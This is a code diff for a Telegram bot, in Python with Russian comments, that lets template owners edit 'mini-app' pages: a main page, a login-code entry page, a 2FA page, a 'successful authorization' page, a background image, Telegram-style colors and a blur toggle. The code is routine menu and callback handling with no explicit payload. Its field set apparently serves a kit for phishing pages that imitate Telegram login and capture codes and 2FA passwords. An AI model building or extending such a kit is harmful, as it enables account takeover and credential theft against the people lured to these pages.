@@ -139,8 +139,33 @@ _BUTTON_FIELDS: dict[str, str] = {
     "expired_btn": "Кнопка просрочки",
 }
 
+# Поля страниц мини-аппа (тексты страниц + фон/цвет).
+_PAGE_FIELDS: dict[str, str] = {
+    "page_main": "Главная страница",
+    "page_code": "Страница ввода кода",
+    "page_2fa": "Страница с 2FA",
+    "page_success": "Страница успешной авторизации",
+    "bg": "Фон (URL картинки)",
+    "ui_color": "Цвет интерфейса (HEX, напр. #2ea6ff)",
+}
+
+# act из подменю страниц → ключ поля в content
+_PAGE_FIELD_MAP: dict[str, str] = {
+    "main": "page_main",
+    "code": "page_code",
+    "twofa": "page_2fa",
+    "success": "page_success",
+    "bg": "bg",
+    "color": "ui_color",
+}
+
 # Всё, что редактируется одним текстовым вводом (+ спец-поле «name»).
-_EDITABLE: dict[str, str] = {**_TEXT_FIELDS, **_BUTTON_FIELDS, "name": "Название"}
+_EDITABLE: dict[str, str] = {
+    **_TEXT_FIELDS,
+    **_BUTTON_FIELDS,
+    **_PAGE_FIELDS,
+    "name": "Название",
+}
 
 # подписи кнопок по умолчанию (если не заданы в шаблоне)
 DEFAULT_START_BTN = "Подтвердить ✅"
@@ -211,9 +236,12 @@ _PAGE_ROWS: list[tuple[str, str]] = [
 ]
 
 
-def _pages_kb(bid: int, tid: int) -> InlineKeyboardMarkup:
+def _pages_kb(bid: int, tid: int, content: dict) -> InlineKeyboardMarkup:
+    blur = int(content.get("blur") or 0)
     b = InlineKeyboardBuilder()
     for label, act in _PAGE_ROWS:
+        if act == "blur":
+            label = f"💨 Блюр фона: {blur}px"
         b.row(
             InlineKeyboardButton(
                 text=label, callback_data=f"pg_act:{bid}:{tid}:{act}"
@@ -223,6 +251,13 @@ def _pages_kb(bid: int, tid: int) -> InlineKeyboardMarkup:
         InlineKeyboardButton(text="⬅️ Назад", callback_data=f"std_open:{bid}:{tid}")
     )
     return b.as_markup()
+
+
+async def _show_pages(callback: CallbackQuery, bid: int, template: dict) -> None:
+    await callback.message.edit_text(
+        f"💎 <b>Страницы мини-апп шаблона «{template['name']}»:</b>",
+        reply_markup=_pages_kb(bid, template["id"], template["content"]),
+    )
 
 
 # ----------------------------------------------------------------- хендлеры
@@ -314,16 +349,30 @@ async def open_pages(callback: CallbackQuery) -> None:
     if template is None or template["owner_id"] != callback.from_user.id:
         await callback.answer("Шаблон не найден.", show_alert=True)
         return
-    await callback.message.edit_text(
-        f"💎 <b>Страницы мини-апп шаблона «{template['name']}»:</b>",
-        reply_markup=_pages_kb(bid, tid),
-    )
+    await _show_pages(callback, bid, template)
     await callback.answer()
 
 
 @router.callback_query(F.data.startswith("pg_act:"))
 async def page_action(callback: CallbackQuery) -> None:
-    await callback.answer("🚧 В разработке", show_alert=True)
+    res = _resolve(callback)  # field = act из подменю
+    if res is None:
+        await callback.answer("Не найдено.", show_alert=True)
+        return
+    bid, tid, act, bot, template = res
+    if act == "blur":
+        cur = int(template["content"].get("blur") or 0)
+        nxt = {0: 4, 4: 8, 8: 12, 12: 0}.get(cur, 0)
+        update_template_content(tid, "blur", nxt)
+        await _show_pages(callback, bid, get_template(tid))
+        await callback.answer(f"Блюр: {nxt}px")
+        return
+    field = _PAGE_FIELD_MAP.get(act)
+    if field is None:
+        await callback.answer("🚧 В разработке", show_alert=True)
+        return
+    await _show_field(callback, bid, template, field)
+    await callback.answer()
 
 
 # ----------------------------------------------- редактор поля (текст/кнопка/название)
@@ -347,7 +396,9 @@ def _field_kb(bid: int, tid: int, field: str, has_value: bool) -> InlineKeyboard
                 text="🗑 Очистить", callback_data=f"fld_clr:{bid}:{tid}:{field}"
             )
         )
-    b.row(InlineKeyboardButton(text="⬅️ Назад", callback_data=f"std_open:{bid}:{tid}"))
+    # поля страниц возвращают в подменю страниц, остальные — в редактор
+    back = f"tpl_pages:{bid}:{tid}" if field in _PAGE_FIELDS else f"std_open:{bid}:{tid}"
+    b.row(InlineKeyboardButton(text="⬅️ Назад", callback_data=back))
     return b.as_markup()
 
 
